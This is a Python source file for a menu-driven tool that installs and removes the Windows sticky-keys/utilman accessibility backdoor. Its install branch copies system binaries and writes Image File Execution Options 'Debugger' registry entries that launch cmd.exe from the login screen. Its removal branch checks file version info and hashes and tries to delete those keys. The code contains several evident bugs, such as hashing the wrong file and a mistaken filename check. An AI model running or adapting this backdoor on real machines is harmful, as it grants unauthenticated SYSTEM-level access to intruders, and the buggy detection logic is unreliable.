import sys
import os
import win32com.shell.shell as shell
import subprocess
import ctypes
import winreg
from hash import calculate_sha256, calculate_md5
from config import header
import time

#TODO: elevate to admin access (compile as exe?), get rid of repeated code, research other backdoors
if __name__ == "__main__":
    print(header)
    while True:
        time.sleep(.5)
        # get the current drive name
        drive = os.getenv("SystemDrive")
        sethcPath = (drive + "\Windows\System32\sethc.exe ")
        sethcRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe')
        utilmanPath = (drive + "\Windows\System32\\utilman.exe ")
        utilmanRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe')
        cmdPath = (drive + "\Windows\System32\cmd.exe ")
        explorerPath = (drive + "\Windows\explorer.exe ")
        powershellPath = (drive + "\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe")
        print("______________________________________________")
        print("Please select from the following options:")
        print("[I]nstall Backdoor.")
        print("[R]emove Backdoor.")
        print("[C]onfigure Settings")
        print("[E]xit")
        choice = input().lower()
        if choice == 'i':
            print("______________________________________________")
            # backup cmd.exe
            cmd = ("copy " + cmdPath)
            print(cmd)
            os.system(cmd)
            # backup sethc.exe
            cmd = ("copy " + sethcPath)
            print(cmd)
            os.system(cmd)
            # backup utliman.exe
            cmd = ("copy " + utilmanPath)
            print(cmd)
            os.system(cmd)
            # copy cmd.exe over sethc.exe
            cmd = ("copy /y " + cmdPath + sethcPath)
            print(cmd)

            #params = ' '.join(cmd + sys.argv[1:] + [ASADMIN])
            #shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=cmd)
            #os.system(cmd)
            #TODO: Prompt user if they want to target sethc.exe or utilman.exe (or both), and use cmd.exe or explorer.exe

            print("Adding sethc.exe debug backdoor to registry.")
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sethcRegistryPath, 0, winreg.KEY_ALL_ACCESS)
                # os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f')
            except Exception as e:
                print(e)

            try:
                os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f')
            except Exception as e:
                print(e)
            print("Adding utliman.exe debug backdoor to registry.")
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, utilmanRegistryPath, 0, winreg.KEY_ALL_ACCESS)
            except Exception as e:
                print(e)
            try:
                os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe" /t REG_SZ /v Debugger /d “C:\windows\system32\cmd.exe” /f')
            except Exception as e:
                print(e)
        if choice == 'r':
            # copy sethc.exe back from backup
            # cmd = ("copy /y " "sethc.exe " + drive + "\windows\system32\sethc.exe")
            #print(cmd)
            # shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=cmd)
            #os.system(cmd)

            #TODO: detect when sethc.exe file has been modified (file properties, hash), replace with clean copy (download?)
            print("______________________________________________")
            print("Checking for sethc.exe file replacement.")
            cmd = ("Get-ItemProperty " + sethcPath + " | select versioninfo | format-list")
            output = subprocess.call([powershellPath, cmd], stdout=open("out.txt", "w+"))
            f = open('out.txt', "r")
            for line in f:
                if 'InternalName' in line or 'OriginalFilename' in line:
                    print(line.strip('\n \t'))
                    if 'sethc.exe' not in line:
                        print("sethc.exe file has been replaced.")
            sethcSha = calculate_sha256(sethcPath)
            print("Sha256: " + sethcSha)
            sethcMd5 = calculate_md5(sethcPath)
            print("Md5: " + sethcMd5)
            print("Performing sethc.exe registry analysis.")
            # TODO: You must remove all sub keys before removing the key
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe', 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteKey(key, 'sethc.exe')
            except WindowsError as e:
                if 'WinError2' in e.strerror:
                    print("Registry entry not found, backdoor not present.")
                else:
                    print(e)

            print("______________________________________________")
            print("Checking for utilman.exe file replacement.")
            cmd = ("Get-ItemProperty " + utilmanPath + " | select versioninfo | format-list")
            output = subprocess.call([powershellPath, cmd], stdout=open("out.txt", "w+"))
            f = open('out.txt', "r")
            for line in f:
                if 'InternalName' in line or 'OriginalFilename' in line:
                    print(line.strip('\n \t'))
                    if 'utilman2.exe' not in line:
                        print("utilman.exe file has been replaced.")
            utilmanSha = calculate_sha256(utilmanPath)
            print("Sha256: " + utilmanSha)
            utlimanMd5 = calculate_md5(sethcPath)
            print("Md5: " + utlimanMd5)
            print("Performing utilman.exe registry analysis.")
            # TODO: You must remove all sub keys before removing the key
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe', 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteKey(key, 'utilman.exe')
            except WindowsError as e:
                if 'WinError2' in str(e):
                    print("Registry entry not found, backdoor not present.")
                else:
                    print(e)

        if choice == 'c':
            pass
        if choice == 'e':
            print("Exiting...")
            exit(0)